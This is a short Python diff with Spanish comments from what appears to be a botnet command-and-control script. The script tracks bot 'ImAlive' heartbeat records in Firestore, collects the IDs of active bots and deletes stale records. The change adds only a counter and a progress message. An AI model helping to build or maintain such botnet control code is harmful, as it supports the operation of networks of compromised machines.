@@ -16,12 +16,16 @@ dt_margen = (now + timedelta(seconds=-150)).strftime("%Y-%m-%d %H:%M:%S")
 # Escribe una orden para la botnet
 lista = []
 docs = db.collection(u'ImAlive').where(u'Hora', u'>', dt_margen).stream()
+cantidad = 0
 for doc in docs:
     if(not(doc.get("Bot_ID") in lista)):
         lista.append(doc.get("Bot_ID"))
 
 docs = db.collection(u'ImAlive').where(u'Hora', u'<=', dt_margen).stream()
 for doc in docs:
+    cantidad += 1
+    if(cantidad == 1000):
+        print("A large volume of data has been detected, this process could take several minutes.")
     doc.reference.delete()
 
 print(mensajeFin)
